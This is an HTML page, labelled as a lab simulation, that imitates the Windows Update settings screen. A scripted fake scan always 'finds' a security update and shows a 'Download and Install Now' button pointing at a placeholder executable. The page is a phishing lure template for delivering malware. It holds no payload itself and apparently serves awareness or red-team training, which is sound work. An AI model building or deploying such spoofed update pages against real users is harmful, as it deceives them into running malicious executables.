<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Configurações - Windows Update (Simulação LAB)</title>
    <style>
        :root {
            --win-blue: #0078d4;
            --win-bg: #f3f3f3;
            --win-text: #202020;
            --win-secondary: #666666;
            --win-border: #e5e5e5;
            --win-error: #e81123;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--win-bg);
            color: var(--win-text);
            margin: 0;
            display: flex;
            height: 100vh;
        }

        /* Sidebar */
        .sidebar {
            width: 250px;
            background-color: #f9f9f9;
            border-right: 1px solid var(--win-border);
            padding-top: 20px;
        }

        .sidebar-item {
            padding: 10px 20px;
            font-size: 14px;
            cursor: pointer;
        }

        .sidebar-item.active {
            background-color: #e2e2e2;
            border-left: 4px solid var(--win-blue);
            font-weight: 600;
        }

        /* Área Principal */
        .main-content {
            flex: 1;
            padding: 40px 10% 20px 40px;
            overflow-y: auto;
        }

        h1 {
            font-weight: 400;
            font-size: 28px;
            margin-bottom: 30px;
        }

        .status-container {
            display: flex;
            align-items: flex-start;
            margin-bottom: 40px;
        }

        .status-icon {
            width: 48px;
            height: 48px;
            background-color: var(--win-blue);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 20px;
        }

        .status-icon svg {
            fill: white;
            width: 24px;
        }

        .status-text h2 {
            margin: 0;
            font-size: 20px;
            font-weight: 600;
        }

        .status-text p {
            margin: 5px 0;
            color: var(--win-secondary);
            font-size: 13px;
        }

        /* Botões */
        .btn-update {
            background-color: var(--win-blue);
            color: white;
            border: none;
            padding: 8px 25px;
            font-size: 14px;
            cursor: pointer;
            margin-top: 15px;
            text-decoration: none;
            display: inline-block;
        }

        .btn-update:hover {
            background-color: #005a9e;
        }

        .btn-download {
            background-color: #e0e0e0;
            color: black;
            border: 1px solid #ccc;
            padding: 8px 20px;
            font-size: 14px;
            text-decoration: none;
            display: none; /* Escondido inicialmente */
            margin-top: 10px;
            width: fit-content;
        }

        .btn-download:hover {
            background-color: #d0d0d0;
        }

        /* Progress Bar */
        #progress-area {
            display: none;
            margin-top: 20px;
            width: 100%;
            max-width: 500px;
        }

        .progress-bar {
            height: 4px;
            background-color: #ccc;
            width: 100%;
            margin-top: 10px;
        }

        .progress-fill {
            height: 100%;
            background-color: var(--win-blue);
            width: 0%;
            transition: width 0.3s;
        }

        /* Alert Box para atualização encontrada */
        #update-found-box {
            display: none;
            background: #fff;
            border: 1px solid var(--win-border);
            padding: 15px;
            margin-top: 20px;
            max-width: 600px;
        }
    </style>
</head>
<body>

    <div class="sidebar">
        <div class="sidebar-item">Início</div>
        <div class="sidebar-item active">Windows Update</div>
        <div class="sidebar-item">Segurança do Windows</div>
    </div>

    <div class="main-content">
        <h1>Windows Update</h1>

        <div class="status-container">
            <div class="status-icon" id="main-icon">
                <svg viewBox="0 0 24 24" id="icon-svg"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
            </div>
            <div class="status-text">
                <h2 id="status-title">Você está atualizado</h2>
                <p id="status-time">Última verificação: Hoje, <span id="clock"></span></p>
                
                <button class="btn-update" id="check-btn" onclick="simulateSearch()">Verificar se há atualizações</button>
                
                <div id="progress-area">
                    <p id="progress-text" style="font-size: 14px;">Procurando...</p>
                    <div class="progress-bar">
                        <div class="progress-fill" id="progress-fill"></div>
                    </div>
                </div>

                <div id="update-found-box">
                    <strong style="color: var(--win-error);">Atualização de Segurança Disponível</strong>
                    <p>KB5022845: Cumulative Update for Windows (x64)</p>
                    <!-- O LINK PARA O FICHEIRO EXE AQUI -->
                    <a href="FICHEIRO.EXE" class="btn-update" id="download-link">Download and Installl Now</a>
                </div>
            </div>
        </div>

        <div style="margin-top: 40px; border-top: 1px solid #ddd; padding-top: 20px;">
            <p style="font-size: 13px; color: #666;">Procurando informações sobre atualizações recentes? <a href="#" style="color: var(--win-blue);">Saiba mais</a></p>
        </div>
    </div>

    <script>
        function updateClock() {
            const now = new Date();
            document.getElementById('clock').innerText = now.toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'});
        }
        updateClock();

        function simulateSearch() {
            const btn = document.getElementById('check-btn');
            const progressArea = document.getElementById('progress-area');
            const progressFill = document.getElementById('progress-fill');
            const statusTitle = document.getElementById('status-title');
            const updateBox = document.getElementById('update-found-box');
            const iconSvg = document.getElementById('icon-svg');
            const mainIcon = document.getElementById('main-icon');

            btn.style.display = 'none';
            progressArea.style.display = 'block';
            statusTitle.innerText = "Verificando...";

            let width = 0;
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    
                    // Finaliza a busca e mostra a atualização disponível
                    progressArea.style.display = 'none';
                    statusTitle.innerText = "Atualizações disponíveis";
                    statusTitle.style.color = "#e81123";
                    updateBox.style.display = 'block';
                    
                    // Muda ícone para exclamação/alerta
                    mainIcon.style.backgroundColor = "#fff1c1";
                    iconSvg.innerHTML = '<path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z" fill="#8a6d3b"/>';
                } else {
                    width += 5;
                    progressFill.style.width = width + '%';
                }
            }, 100);
        }
    </script>
</body>
</html>
